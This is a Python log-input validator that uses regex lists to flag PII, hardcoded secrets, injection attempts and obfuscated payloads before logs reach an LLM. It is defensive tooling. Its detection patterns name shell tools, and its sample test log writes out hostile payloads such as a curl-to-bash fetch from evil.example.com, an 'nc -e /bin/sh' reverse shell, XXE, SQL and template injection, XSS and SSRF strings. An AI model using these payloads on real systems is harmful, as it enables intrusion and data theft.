# log_validator.py
"""
Enterprise-Grade Log Input Validator
Validates raw log text before processing by AI/LLM systems
Includes: size limits, format validation, PII detection, injection prevention
"""

import re
import json
import hashlib
import logging
from datetime import datetime
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass, field
from enum import Enum

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Defines how severe a detected issue is — from minor info to critical error
class SeverityLevel(Enum):
    """Validation severity levels"""
    CRITICAL = "critical"  # Block processing
    HIGH = "high"         # Block processing
    MEDIUM = "medium"     # Warn but allow
    LOW = "low"          # Info only
    INFO = "info"        # Informational

# Stores details about a single validation problem (severity, type, message, and fix suggestion)
@dataclass
class ValidationIssue:
    """Individual validation issue"""
    severity: SeverityLevel
    category: str
    message: str
    location: Optional[str] = None
    recommendation: str = ""

# Holds the overall result of log validation, including validity, issues found, and cleaned log data
@dataclass
class ValidationResult:
    """Log validation result"""
    is_valid: bool
    log_id: str
    timestamp: str
    issues: List[ValidationIssue] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)
    sanitized_log: Optional[str] = None
    
    # Returns all issues that are critical or high severity from the validation results
    def get_critical_issues(self) -> List[ValidationIssue]:
        """Get critical/high severity issues"""
        return [i for i in self.issues if i.severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH]]
    
    # Converts the validation result and its issues into a dictionary format for easy export or JSON output.
    def to_dict(self) -> Dict:
        """Convert to dictionary"""
        return {
            "is_valid": self.is_valid,
            "log_id": self.log_id,
            "timestamp": self.timestamp,
            "issues": [
                {
                    "severity": i.severity.value,
                    "category": i.category,
                    "message": i.message,
                    "location": i.location,
                    "recommendation": i.recommendation
                }
                for i in self.issues
            ],
            "metadata": self.metadata
        }
    
# Patterns that indicate encoded/obfuscated/suspicious content (possible exfiltration or malware).

class LogValidator:
    """Production-ready log input validator"""
    
    # Size limits
    #MAX_LOG_SIZE = 10 * 1024 * 1024  # 10MB
    #MAX_LINE_LENGTH = 50000
   # MAX_LINES = 100000
    
    # PII patterns
    PII_PATTERNS = {
        'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
        'credit_card': r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
        'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
        'phone': r'\b(?:\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b',
        'ip_address': r'\b(?:\d{1,3}\.){3}\d{1,3}\b',
        'api_key': r'(?i)(api[-]?key|apikey|api[-]?secret)[\s:=]+[\'"]?([a-zA-Z0-9_\-]{20,})[\'"]?',
        'token': r'(?i)(bearer|token|jwt)[\s:=]+[\'"]?([a-zA-Z0-9_\-\.]{20,})[\'"]?',
        'password': r'(?i)(password|passwd|pwd)[\s:=]+[\'"]?([^\s\'"]{6,})[\'"]?',
        'aws_key': r'(?:AKIA|A3T|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}',
        'private_key': r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
        
        'passport_number': r'\b[A-PR-WYa-pr-wy][1-9]\d\s?\d{4}[1-9]\b',  # Generic passport
         'aadhaar': r'\b\d{4}\s\d{4}\s\d{4}\b',  # Indian Aadhaar
         'pan_number': r'\b[A-Z]{5}[0-9]{4}[A-Z]\b',  # Indian PAN
        'driver_license': r'\b[A-Z]{1,2}\d{2}\s?\d{11}\b',  # Generic DL

        #  Financial Info
        'credit_card': r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
        'bank_account': r'\b\d{9,18}\b',  # Generic account number
        'ifsc_code': r'\b[A-Z]{4}0[A-Z0-9]{6}\b',  # Indian IFSC code
        'iban': r'\b[A-Z]{2}\d{2}[A-Z0-9]{1,30}\b',  # International bank account

        #  Digital Identifiers
        'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
        'username': r'(?i)(username|user_name|login)[\s:=]+[\'"]?[\w.@-]+[\'"]?',
        'ip_address': r'\b(?:\d{1,3}\.){3}\d{1,3}\b',
        'mac_address': r'\b([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})\b',

        #  Secrets & Tokens
        'api_key': r'(?i)(api[-]?key|apikey|api[-]?secret)[\s:=]+[\'"]?([a-zA-Z0-9_\-]{20,})[\'"]?',
        'token': r'(?i)(bearer|token|jwt)[\s:=]+[\'"]?([a-zA-Z0-9_\-\.]{20,})[\'"]?',
        'auth_header': r'(?i)authorization:\s?bearer\s[a-zA-Z0-9\-_.]+',
        'password': r'(?i)(password|passwd|pwd)[\s:=]+[\'"]?([^\s\'"]{6,})[\'"]?',
        'aws_key': r'(?:AKIA|A3T|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}',
        'azure_key': r'(?i)(azure[-_ ]?(key|token|secret))[\s:=]+[\'"]?[a-zA-Z0-9_\-]{20,}[\'"]?',
        'private_key': r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
        'client_secret': r'(?i)(client[-_ ]?secret)[\s:=]+[\'"]?[a-zA-Z0-9_\-]{10,}[\'"]?',
        'firebase_token': r'AAA[a-zA-Z0-9_-]{7,}',

        #  Contact Details
        'phone': r'\b(?:\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b',
        'intl_phone': r'\+\d{1,3}[-\s]?\d{1,4}[-\s]?\d{4,10}',

        #  Address or Geo Info
        'address': r'\b\d{1,4}\s[\w\s.,-]+(street|st|road|rd|lane|ln|ave|avenue|block)\b',
        'zipcode': r'\b\d{5}(-\d{4})?\b',

        #🧬 Healthcare or Insurance
        'medical_id': r'\b\d{10,12}\b',
        'insurance_number': r'\b[A-Z]{2}\d{6,10}\b',
        'medical_terms': r'(?i)\b(HIPAA|diagnosis|patient_id|lab_results)\b',
        'ssn_unformatted': r'\b\d{9}\b',  # SSN without dashes
        'crypto_wallet': r'\b(0x[a-fA-F0-9]{40})\b',  # Ethereum-like wallet
        'jwt_token': r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',  # JWT format


        #  Device / System Info
        'machine_id': r'\b[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12}\b',  # UUIDs
        'session_id': r'(?i)(session[-_]?id)[\s:=]+[\'"]?[a-zA-Z0-9\-]{8,}[\'"]?',
        'cookie': r'(?i)(cookie|set-cookie)[:=]\s?[A-Za-z0-9_\-=%]+'
        
    }
       



    BANNED_TEXT_PATTERNS = {
        #  Common offensive or placeholder terms
        'offensive_terms': r'\b(dummy|test123|xyzpassword|foobar|loremipsum|tempuser|testuser|sampleuser)\b',

        #  Hardcoded credentials or passwords
        'hardcoded_passwords': r'(?i)password\s*=\s*[\'"].+[\'"]',
        'hardcoded_usernames': r'(?i)username\s*=\s*[\'"].+[\'"]',
        'hardcoded_tokens': r'(?i)token\s*=\s*[\'"].+[\'"]',
        'hardcoded_client_secret': r'(?i)client[_-]?secret\s*=\s*[\'"].+[\'"]',

        #  API key or secret exposure
        'api_key_exposure': r'(?i)api[_-]?key\s*[:=]\s*[\'"].+[\'"]',
        'secret_key_exposure': r'(?i)secret[_-]?key\s*[:=]\s*[\'"].+[\'"]',
        'bearer_token_exposure': r'(?i)authorization\s*:\s*bearer\s+[a-zA-Z0-9._\-]+',

        #  Internal or staging URLs
        'internal_urls': r'https?:\/\/(dev|staging|internal|qa|sandbox|local)\.',
        'localhost_references': r'https?:\/\/(localhost|127\.0\.0\.1)(:\d+)?',

        #  Secrets or sensitive keywords
        'secrets': r'(?i)(secret|token|key|passwd|credentials)\s*[:=]',
        'confidential_data': r'(?i)(confidential|classified|restricted)\s+data',

        #  Debug or testing artifacts
        'debug_statements': r'(?i)(debug|print|console\.log)\(',
        'todo_notes': r'(?i)\b(todo|fixme|hack|tempfix)\b',
        'mock_data': r'(?i)(mock|fake|placeholder|sample)\s+(data|value|info)',

        #  Deprecated or internal configurations
        'deprecated_config': r'(?i)(deprecated|legacy|internal_use_only)',
        'internal_identifiers': r'(?i)(internal_id|sys_internal|admin_token)',

        #  SSH, encryption, or private key references
        'ssh_private_key': r'-----BEGIN (?:RSA |DSA |EC )?PRIVATE KEY-----',
        'encryption_keys': r'(?i)(encryption|ssl|tls|pgp)[_-]?(key|secret)\s*[:=]\s*[\'"].+[\'"]',

        #  Cloud or environment credentials
        'aws_secret': r'(?i)aws[_-]?secret[_-]?access[_-]?key\s*[:=]\s*[\'"].+[\'"]',
        'gcp_service_key': r'(?i)(gcp|google)_?service(_?account)?_?key\s*[:=]\s*[\'"].+[\'"]',
        'azure_connection_string': r'(?i)azure[_-]?connection[_-]?string\s*[:=]\s*[\'"].+[\'"]',

        #  Environment leaks
        'env_file_exposure': r'(?i)(dotenv|\.env|environment)\s*(file|var)?\s*[:=]',
        'config_leak': r'(?i)(config|settings|properties|secrets?)\s*[:=]\s*[\'"].+[\'"]',
        }

   

 
    
    # Log injection patterns
    INJECTION_PATTERNS = {
        # Shell / OS command related
        'command_injection': r'[;&|`$(){}]',                          # existing: metacharacters
        'shell_redirect': r'(?:>\s*/|2>\s*/|>\s+[A-Za-z0-9./_-]+)',   # redirecting output to files
        'shell_pipe': r'\|\s*bash\b',                                # piping to bash
        'shell_rm_rf': r'\brm\s+-rf\b',                              # destructive commands
        'shell_wget_curl': r'\b(?:wget|curl)\s+https?:\/\/',         # remote fetch & execute
        'powershell_exec': r'(?i)powershell\s+-[a-z]+\s',            # powershell invocation
        'cmd_exec': r'(?i)cmd\.exe|winrm',                           # Windows command patterns

        # Path traversal / filesystem
        'path_traversal': r'\.\.[/\\]',                              # existing
        'absolute_unix_path': r'(/etc/passwd|/bin/sh|/usr/bin/)',     # sensitive unix paths
        'windows_path': r'[A-Za-z]:\\(?:[^\\\/:*?"<>|\r\n]+\\)*',    # drive-letter paths

        # Null / control bytes & encodings
        'null_byte': r'\x00',                                        # existing
        'encoded_null': r'%00',                                      # URL-encoded null byte
        'control_chars': r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]',        # existing

        # XSS / script / HTML vectors
        'script_tag': r'(?i)<\s*script\b[^>]*>.*?<\s*/\s*script\s*>',# existing improved
        'html_event_handler': r'(?i)on\w+\s*=',                      # onclick=, onerror= etc.
        'javascript_protocol': r'(?i)javascript:\s*',                # javascript: links

        # SQL injection
        'sql_injection': r'(?i)(?:\bunion\b|\bselect\b|\binsert\b|\bupdate\b|\bdelete\b|\bdrop\b|\bexec\b|\bexecute\b)\s',
        'sql_comment': r'(--\s|\b/\*.*?\*/)',                       # SQL comments
        'sql_tautology': r'(?i)\bOR\b\s+1=1\b',                      # classic tautology

        # NoSQL / Mongo injection
        'nosql_injection': r'(?i)\{\s*\$where\s*:' ,                # $where operator or other $ operators
        'nosql_operator': r'(?i)"\s*\$ne\s*":|"\s*\$gt\s*":',        # common operators in payloads

        # LDAP / XML / XPath / XXE
        'ldap_injection': r'[*()\\]',                               # existing
        'xml_injection': r'(?i)<\?xml|<!DOCTYPE|\bENTITY\b',        # XXE/doctype directives
        'xpath_injection': r'(?i)(?:/node\(\)|concat\(|substring\()',

        # Template Injection (Jinja, Twig, etc.)
        'template_expression': r'(?s)\{\{.*?\}\}|\{%.*?%\}|\$\{.*?\}', # Jinja/Twig/JS templates
        'template_eval': r'\beval\s*\(',                             # eval usage in templates/scripts

        # Format string / printf
        'format_string': r'%[sdxuf]',                                # existing-ish
        'printf_style': r'(?i)printf\s*\(',                          # printf usage

        # CRLF / header injection / email SMTP
        'crlf_injection': r'(?:%0a|%0d|\r\n)[\w\-]+?:\s',             # encoded/newline header injection
        'http_header_injection': r'(?i)\r\n\s*[A-Za-z0-9-]+:\s',     # suspicious header line in payload

        # SSRF / local resource access attempts
        'ssrf_localhost': r'(?i)https?:\/\/(?:127\.0\.0\.1|localhost|0\.0\.0\.0|169\.254\.)', 
        'ssrf_file_proto': r'(?i)file:\/\/\/',                       # file:// protocol in URLs

        # Remote code execution / eval / exec patterns
        'rce_eval_exec': r'(?i)\b(eval|exec|system|popen|shell_exec|passthru)\s*\(',
        'php_code_exec': r'(?i)<\?php\b|phpinfo\s*\(',

        # Command substitution / backticks and $()
        'command_substitution': r'[`]\s*[^`]+?\s*[`]|\$\([^)]*\)',

        # Encoded & obfuscated payload indicators
        'base64_blob': r'(?:[A-Za-z0-9+/]{100,}={0,2})',              # large base64 blobs
        'hex_blob': r'(?:0x[0-9a-fA-F]{40,})',                       # long hex sequences

        # Misc dangerous tokens / patterns
        'telnet_ftp_attempt': r'(?i)\b(telnet|ftp|tftp|rsh|rexec)\b',
        'suspicious_exec_patterns': r'(?i)\b(curl|nc|ncat|netcat|python)\s+-c\b',  # run commands via interpreter

        # Common obfuscation patterns: url-encoded, unicode escapes
        'url_encoded': r'%[0-9a-fA-F]{2,}',                           # many %xx encodings
        'unicode_escape': r'\\u[0-9a-fA-F]{4}',                      # existing elsewhere

        # Defensive: potential false-positive cleanup guard (tweak as needed)
        # e.g. allow some SQL words when clearly part of message; tune thresholds elsewhere
    }
    
    # Suspicious patterns
    SUSPICIOUS_PATTERNS = {
        # Existing ones
        'encoded_data': r'(?:[A-Za-z0-9+/]{40,}={0,2})',  # Base64
        'hex_encoded': r'(?:0x)?[0-9a-fA-F]{40,}',  # Long hex strings
        'unicode_escape': r'\\u[0-9a-fA-F]{4}',  # Unicode escape sequences
        'excessive_repetition': r'(.)\1{50,}',  # Repeated characters (compression or DoS)
        'obfuscation': r'(?:[A-Z]{10,}|[a-z]{10,}){3,}',  # Nonsense text blocks

        # 1️ Suspiciously long continuous alphanumeric strings (possible hashes or encoded tokens)
        'long_hash_or_token': r'\b[a-fA-F0-9]{32,}\b',

        # 2️ Base85, URL-safe, or custom encoding formats
        'base85_encoded': r'[A-Za-z0-9!#$%&()*+\-;<=>?@^_`{|}~]{40,}',
        'url_encoded': r'(?:%[0-9A-Fa-f]{2}){10,}',

        # 3️ Possible data exfiltration attempts via URLs or domains
        'suspicious_url': r'https?:\/\/[a-zA-Z0-9\-]{20,}\.(com|net|org|ru|cn|xyz)',
        
        # 4️ Encoded PowerShell or Bash one-liners
        'powershell_encoded': r'(?i)powershell\.exe.+-enc\s+[A-Za-z0-9+/=]+',
        'bash_encoded': r'(?i)echo\s+[A-Za-z0-9+/=]{40,}\s*\|\s*base64',

        # 5️ Hidden or compressed data in logs
        'gzip_signature': r'(?i)H4sIA[A-Za-z0-9+/=]+',  # gzip base64 pattern
        'zlib_signature': r'(?i)eJ[A-Za-z0-9+/=]+',  # zlib compressed data
        'binary_blob': r'(?:[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]{10,})',  # raw binary

        # 6️ Shell command obfuscation
        'command_substitution': r'\$\([^)]+\)',  # $(...) constructs
        'escaped_commands': r'\\[abfnrtv\'"\\]',  # Escape sequences
        'mixed_case_commands': r'(?i)(cMd|PoWeRsHeLl|BaSh)\b',  # Case-mixed commands

        # 7️ Suspicious script tags or encoded JS payloads
        'encoded_javascript': r'(?i)(eval|unescape|String\.fromCharCode)\s*\(',
        'data_uri_payload': r'data:[a-zA-Z]+/[a-zA-Z]+;base64,[A-Za-z0-9+/=]+',

        # 8️ Excessive nested braces or parentheses (possible code obfuscation)
        'nested_braces': r'[{(\[][^})\]]{100,}[})\]]',

        # 9️ Repeated suspicious keywords (common in malware logs)
        'repeated_keywords': r'(?i)\b(exec|shell|cmd|run|eval|decode)\b.{0,20}\1',

        #  Suspicious Unicode homoglyphs or invisible characters
        'zero_width_chars': r'[\u200B-\u200D\uFEFF]',  # Zero-width space, joiner
        'right_to_left_override': r'[\u202E\u202B]',  # RLO/LRO text direction change

    }
    # Initializes the log validator with options for PII handling, sanitization, and strict error control.
    def __init__(
        self,
        #max_log_size: int = MAX_LOG_SIZE,
        allow_pii: bool = False,
        sanitize_pii: bool = True,
        strict_mode: bool = False
    ):
        """
        Initialize log validator
        
        Args:
            max_log_size: Maximum log size in bytes
            allow_pii: Allow PII in logs
            sanitize_pii: Sanitize detected PII
            strict_mode: Fail on any critical issue
        """
       # self.max_log_size = max_log_size
        self.allow_pii = allow_pii
        self.sanitize_pii = sanitize_pii
        self.strict_mode = strict_mode
    # Runs all validation checks on a log (format, security, PII, injections, etc.) and returns the overall result.
    def validate(self, log_text: str, metadata: Optional[Dict] = None) -> ValidationResult:
        """
        Validate log text
        
        Args:
            log_text: Raw log text to validate
            metadata: Optional metadata about the log
            
        Returns:
            ValidationResult with validation status and issues
        """
        log_id = hashlib.sha256(log_text.encode()).hexdigest()[:16]
        timestamp = datetime.utcnow().isoformat() + "Z"
        issues = []
        
        # Input validation
        if not log_text or not log_text.strip():
            return ValidationResult(
                is_valid=False,
                log_id=log_id,
                timestamp=timestamp,
                issues=[ValidationIssue(
                    severity=SeverityLevel.CRITICAL,
                    category="input_validation",
                    message="Empty or whitespace-only log input",
                    recommendation="Provide non-empty log content"
                )],
                metadata=metadata or {}
            )
        
        # Size validation
       # size_issues = self._validate_size(log_text)
       # issues.extend(size_issues)
        
        # Format validation
        format_issues = self._validate_format(log_text)
        issues.extend(format_issues)
        
        # Security validation
        security_issues = self._validate_security(log_text)
        issues.extend(security_issues)
        
        # PII detection
        pii_issues, sanitized_log = self._detect_pii(log_text)
        issues.extend(pii_issues)
        
        # Injection detection
        injection_issues = self._detect_injections(log_text)
        issues.extend(injection_issues)
        
        # Suspicious pattern detection
        suspicious_issues = self._detect_suspicious_patterns(log_text)
        issues.extend(suspicious_issues)

        # Banned text detection
        banned_issues = self._detect_banned_text(log_text)
        issues.extend(banned_issues)
        
        # Determine validity
        critical_issues = [i for i in issues if i.severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH]]
        is_valid = len(critical_issues) == 0 if self.strict_mode else len([i for i in issues if i.severity == SeverityLevel.CRITICAL]) == 0
        
        # Build metadata
        result_metadata = {
            "original_size": len(log_text),
            "line_count": log_text.count('\n') + 1,
            "issue_count": len(issues),
            "critical_count": len(critical_issues)
        }
        if metadata:
            result_metadata.update(metadata)
        
        return ValidationResult(
            is_valid=is_valid,
            log_id=log_id,
            timestamp=timestamp,
            issues=issues,
            metadata=result_metadata,
            sanitized_log=sanitized_log if self.sanitize_pii else None
        )
    '''''
    def _validate_size(self, log_text: str) -> List[ValidationIssue]:
        """Validate log size constraints"""
        issues = []
        
        # Total size check
        log_size = len(log_text.encode('utf-8'))
        if log_size > self.max_log_size:
            issues.append(ValidationIssue(
                severity=SeverityLevel.CRITICAL,
                category="size_limit",
                message=f"Log size {log_size} bytes exceeds maximum {self.max_log_size} bytes",
                recommendation=f"Split log into chunks under {self.max_log_size} bytes"
            ))
        
        # Line count check
        lines = log_text.split('\n')
        if len(lines) > self.MAX_LINES:
            issues.append(ValidationIssue(
                severity=SeverityLevel.HIGH,
                category="size_limit",
                message=f"Log has {len(lines)} lines, exceeds maximum {self.MAX_LINES}",
                recommendation="Split log into smaller batches"
            ))
        
        # Line length check
        for idx, line in enumerate(lines[:100]):  # Check first 100 lines
            if len(line) > self.MAX_LINE_LENGTH:
                issues.append(ValidationIssue(
                    severity=SeverityLevel.MEDIUM,
                    category="size_limit",
                    message=f"Line {idx + 1} has {len(line)} characters, exceeds {self.MAX_LINE_LENGTH}",
                    location=f"line:{idx + 1}",
                    recommendation="Check for malformed or concatenated log entries"
                ))
                break
        
        return issues '''
    # Checks the log’s structure for format issues like null bytes or invalid UTF-8 characters.
    def _validate_format(self, log_text: str) -> List[ValidationIssue]:
        """Validate log format and structure"""
        issues = []
        
        # Check for null bytes
        if '\x00' in log_text:
            issues.append(ValidationIssue(
                severity=SeverityLevel.CRITICAL,
                category="format_validation",
                message="Log contains null bytes",
                recommendation="Remove null bytes before processing"
            ))
        
        # Check encoding
        try:
            log_text.encode('utf-8')
        except UnicodeEncodeError as e:
            issues.append(ValidationIssue(
                severity=SeverityLevel.HIGH,
                category="format_validation",
                message=f"Log contains invalid UTF-8 characters: {str(e)}",
                recommendation="Ensure log is UTF-8 encoded"
            ))
        
        # Check for excessive whitespace
        if re.search(r'\s{1000,}', log_text):
            issues.append(ValidationIssue(
                severity=SeverityLevel.MEDIUM,
                category="format_validation",
                message="Log contains excessive whitespace (1000+ consecutive spaces)",
                recommendation="Check for formatting issues"
            ))
        
        return issues
    # Scans the log for hidden or unsafe control characters that could pose security or parsing risks
    def _validate_security(self, log_text: str) -> List[ValidationIssue]:
        """Validate security aspects"""
        issues = []
        
        # Check for control characters
        control_chars = re.findall(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]', log_text)
        if control_chars:
            issues.append(ValidationIssue(
                severity=SeverityLevel.HIGH,
                category="security",
                message=f"Log contains {len(control_chars)} control characters",
                recommendation="Remove control characters that may cause parsing issues"
            ))
        
        return issues
    
    def _detect_pii(self, log_text: str) -> Tuple[List[ValidationIssue], Optional[str]]:
        """Detect PII in log text"""
        issues = []
        sanitized_log = log_text
        
        for pii_type, pattern in self.PII_PATTERNS.items():
            matches = list(re.finditer(pattern, log_text))
            if matches:
                severity = SeverityLevel.CRITICAL if not self.allow_pii else SeverityLevel.INFO
                issues.append(ValidationIssue(
                    severity=severity,
                    category="pii_detection",
                    message=f"Detected {len(matches)} {pii_type.replace('_', ' ')} pattern(s)",
                    recommendation=f"Remove or redact {pii_type} before processing"
                ))
                
                # Sanitize if enabled
                if self.sanitize_pii:
                    sanitized_log = re.sub(pattern, f"[REDACTED_{pii_type.upper()}]", sanitized_log)
        
        return issues, sanitized_log if self.sanitize_pii else None
    
    # Detects possible injection attacks (like SQL, command, or script injections) in the log text.
    def _detect_injections(self, log_text: str) -> List[ValidationIssue]:
        """Detect injection attempts"""
        issues = []
        
        for injection_type, pattern in self.INJECTION_PATTERNS.items():
            if re.search(pattern, log_text):
                issues.append(ValidationIssue(
                    severity=SeverityLevel.HIGH,
                    category="injection_detection",
                    message=f"Detected potential {injection_type.replace('_', ' ')}",
                    recommendation="Review log content for malicious patterns"
                ))
        
        return issues
    
    def _detect_banned_text(self, log_text: str) -> List[ValidationIssue]:
      """Detect banned text or hardcoded secrets"""
      issues = []

      for banned_type, pattern in self.BANNED_TEXT_PATTERNS .items():
           matches = re.findall(pattern, log_text)
           if matches:
               issues.append(ValidationIssue(
                severity=SeverityLevel.HIGH,
                category="banned_text_detection",
                message=f"Detected {len(matches)} instance(s) of {banned_type.replace('_', ' ')}",
                recommendation="Remove banned or sensitive text before processing"
                ))

      return issues

    def _detect_suspicious_patterns(self, log_text: str) -> List[ValidationIssue]:
        """Detect suspicious patterns"""
        issues = []
        
        for pattern_type, pattern in self.SUSPICIOUS_PATTERNS.items():
            matches = list(re.finditer(pattern, log_text))
            if matches and len(matches) > 5:  # Multiple occurrences
                issues.append(ValidationIssue(
                    severity=SeverityLevel.MEDIUM,
                    category="suspicious_pattern",
                    message=f"Detected {len(matches)} instances of {pattern_type.replace('_', ' ')}",
                    recommendation="Review for unusual content"
                ))
        
        return issues


# Utility functions

#These functions validate logs — either a single log file or a batch of logs using the LogValidator class and return detailed validation results for each
def validate_log_file(file_path: str, validator: Optional[LogValidator] = None) -> ValidationResult:
    """Validate log from file"""
    if validator is None:
        validator = LogValidator()
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            log_text = f.read()
        
        metadata = {
            "source": file_path,
            "source_type": "file"
        }
        
        return validator.validate(log_text, metadata)
    
    except Exception as e:
        return ValidationResult(
            is_valid=False,
            log_id="error",
            timestamp=datetime.utcnow().isoformat() + "Z",
            issues=[ValidationIssue(
                severity=SeverityLevel.CRITICAL,
                category="file_error",
                message=f"Failed to read log file: {str(e)}",
                recommendation="Check file path and permissions"
            )],
            metadata={"source": file_path, "error": str(e)}
        )

# Validates multiple logs at once using the LogValidator class.
def validate_log_batch(logs: List[str], validator: Optional[LogValidator] = None) -> List[ValidationResult]:
    """Validate multiple logs"""
    if validator is None:
        validator = LogValidator()
    
    return [validator.validate(log, {"batch_index": idx}) for idx, log in enumerate(logs)]


# Example usage
if __name__ == "__main__":

    # Initialize validator
    validator = LogValidator(
        #max_log_size=5 * 1024 * 1024,  # 5MB
        allow_pii=False,
        sanitize_pii=True,
        strict_mode=True
    )
    
    # Example log with issues
   # test_log = """
    #2025-11-05 14:30:00 ERROR Test failed
    #User email: john.doe@example.com
    #API Key: sk_live_1234567890abcdefghijklmnop
    #Connection failed to 192.168.1.100
    #""" 
    #Example testing banned words
    
    
#     test_log = '''
#    2025-11-05 19:20:00 DEBUG print('Debugging mode enabled')
#     INFO Using testuser credentials for API access
#     WARNING Found password = "SuperSecret123!"
#     ALERT api_key = "abcd1234apikeyexample"
#     NOTICE Secret_Key = "do_not_log_this"
#     INFO Internal URL: https://staging.internal.example.com/api
#     ERROR Connection using ssh key -----BEGIN RSA PRIVATE KEY-----
#     CONFIG dotenv file loaded from /app/.env
#     '''

    #Example testing 

    test_log = r"""
        2025-11-06 10:00:00 INFO Normal startup message

    # Shell / OS command tries
    2025-11-06 10:00:01 WARN Received user input: `rm -rf /tmp/test`  # backticks -> command substitution
    2025-11-06 10:00:02 WARN Piped command: echo "run" | bash
    2025-11-06 10:00:03 WARN Exec attempt: $(curl http://evil.example.com/payload | bash)
    2025-11-06 10:00:04 WARN Powershell call: powershell -NoProfile -Command "Invoke-WebRequest 'http://x'"

    # Path traversal & sensitive file access
    2025-11-06 10:00:05 ERROR Open failed: ../../etc/passwd
    2025-11-06 10:00:06 ERROR Windows path seen: C:\Windows\System32\drivers\etc\hosts

    # Null / encoded bytes & control chars
    2025-11-06 10:00:07 INFO Received payload with null: %00 (url-encoded) and raw \x00
    2025-11-06 10:00:08 INFO Control chars: \x07\x08\x0B (bell/backspace/vertical tab)

    # XSS / HTML / JS vectors
    2025-11-06 10:00:09 ALERT <script>alert('xss')</script>
    2025-11-06 10:00:10 ALERT Anchor using javascript: javascript:alert(1)
    2025-11-06 10:00:11 WARN HTML event: <img src=x onerror=alert(1)>

    # SQL injection patterns
    2025-11-06 10:00:12 ERROR Query param: ' OR 1=1 -- 
    2025-11-06 10:00:13 ERROR Suspicious SQL: SELECT * FROM users WHERE username='admin' OR 1=1;

    # NoSQL / Mongo-like payload
    2025-11-06 10:00:14 WARN Payload: {"$where": "this.password.match(/.*/)"}
    2025-11-06 10:00:15 WARN Operator injection: {"username": {"$ne": null}}

    # LDAP / XML / XXE / XPath
    2025-11-06 10:00:16 ERROR Received XML: <?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    2025-11-06 10:00:17 WARN XPath snippet: /bookstore/book[author='admin' or 1=1]

    # Template injection & eval-like constructs
    2025-11-06 10:00:18 DEBUG Template: {{ config.ADMIN_PASSWORD }}
    2025-11-06 10:00:19 DEBUG Jinja eval attempt: {% set a = cycler(1) %}{{ a.next() }}
    2025-11-06 10:00:20 WARN Eval call: eval("malicious()")

    # Format strings / printf style
    2025-11-06 10:00:21 INFO Format payload: Got %s bytes from user input

    # CRLF / HTTP header injection / SSRF / file protocol
    2025-11-06 10:00:22 WARN Header injection: GET / HTTP/1.1\r\nHost: innocent\r\nX-Injected: injected
    2025-11-06 10:00:23 WARN SSRF attempt: http://127.0.0.1:8000/admin
    2025-11-06 10:00:24 WARN File protocol: file:///etc/shadow

    # Remote exec / common attack utilities
    2025-11-06 10:00:25 ERROR Shell exec pattern: python -c "import os; os.system('id')"
    2025-11-06 10:00:26 ERROR Tools: nc -e /bin/sh 192.168.0.1 4444

    # Encoded / obfuscated blobs (base64 / hex)
    2025-11-06 10:00:27 INFO Large base64: AAAA... (base64 blob example) AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
    2025-11-06 10:00:28 INFO Hex blob: 0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890

    # Misc suspicious tokens & service attempts
    2025-11-06 10:00:29 WARN Telnet attempt: telnet 10.0.0.1
    2025-11-06 10:00:30 WARN FTP attempt: ftp://evil.example.com/shell

    # Template-like JS interpolation and command substitution
    2025-11-06 10:00:31 DEBUG JS template: ${process.env.PASSWORD}
    """

    
    # Validate
    result = validator.validate(test_log)
    
    # Print results
    print(json.dumps(result.to_dict(), indent=2))
    
    if result.sanitized_log:
        print("\n=== Sanitized Log ===")
        print(result.sanitized_log)
